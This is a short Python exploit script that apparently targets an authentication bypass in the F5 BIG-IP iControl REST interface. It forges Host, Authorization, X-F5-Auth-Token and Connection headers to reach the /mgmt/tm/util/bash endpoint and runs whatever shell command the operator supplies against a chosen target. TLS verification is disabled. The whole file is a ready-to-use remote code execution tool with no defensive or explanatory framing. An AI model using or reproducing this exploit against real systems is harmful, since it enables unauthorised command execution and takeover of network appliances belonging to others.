#!/usr/bin/env python3
import argparse, requests, urllib3
from termcolor import colored
urllib3.disable_warnings()

version = 0.1

def exploit(target, command):

    try:

        url = f'https://{target}/mgmt/tm/util/bash'
        headers = {
            'Host': '127.0.0.1',
            'Authorization': 'YWRtaW46',
            'X-F5-Auth-Token': '0',        
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'
            
        }
        j = {'command':'run','utilCmdArgs':'-c "{0}"'.format(command)}
        r = requests.post(url, headers=headers, json=j, verify=False)
        print(r.json()['commandResult'].strip())

    except Exception as e:
        print(e)

def banner():

    ## version
    print(colored("version {}" .format(version), "green", attrs=['bold']))

if __name__ == "__main__":

    ## version
    banner()

    ## parse argument
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', default=False)
    parser.add_argument('-c', '--command', help='The command to execute, eg: id', default='id')
    args = parser.parse_args()

    if args.target is not False:
        
        exploit(args.target, args.command) 

    else:

        parser.print_help()
        parser.exit()